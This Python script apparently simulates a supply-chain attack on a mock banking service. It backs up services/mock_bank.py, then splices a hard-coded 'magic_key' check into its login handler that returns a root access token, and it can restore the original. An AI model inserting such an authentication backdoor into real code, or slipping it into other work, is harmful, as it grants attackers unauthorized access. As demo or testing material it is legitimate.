#!/usr/bin/env python3
import sys
import os
import shutil

# Add root to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def inject_supply_chain():
    target_file = "services/mock_bank.py"
    backup_file = "services/mock_bank.py.bak"

    if not os.path.exists(target_file):
        print("Target not found.")
        return

    print(f"💉 INJECTING SUPPLY CHAIN BACKDOOR into {target_file}")

    # Backup
    shutil.copy(target_file, backup_file)

    with open(target_file, 'r') as f:
        content = f.read()

    # Inject Backdoor
    backdoor_code = """
    # BACKDOOR INJECTED
    if data.get('magic_key') == 'S3CR3T_B4CKD00R':
        return {"status": 200, "body": {"token": "ROOT_ACCESS", "msg": "Access Granted via Supply Chain"}}
    # END BACKDOOR
"""

    # Inject into handle_login
    if "def handle_login(self, data):" in content:
        parts = content.split("def handle_login(self, data):")
        new_content = parts[0] + "def handle_login(self, data):" + backdoor_code + parts[1]

        with open(target_file, 'w') as f:
            f.write(new_content)
        print("✅ Injection Successful.")
    else:
        print("❌ Injection Failed: function signature not found.")

def restore_supply_chain():
    target_file = "services/mock_bank.py"
    backup_file = "services/mock_bank.py.bak"

    if os.path.exists(backup_file):
        shutil.copy(backup_file, target_file)
        print("✅ Restored original service.")
    else:
        print("No backup found.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "restore":
        restore_supply_chain()
    else:
        inject_supply_chain()
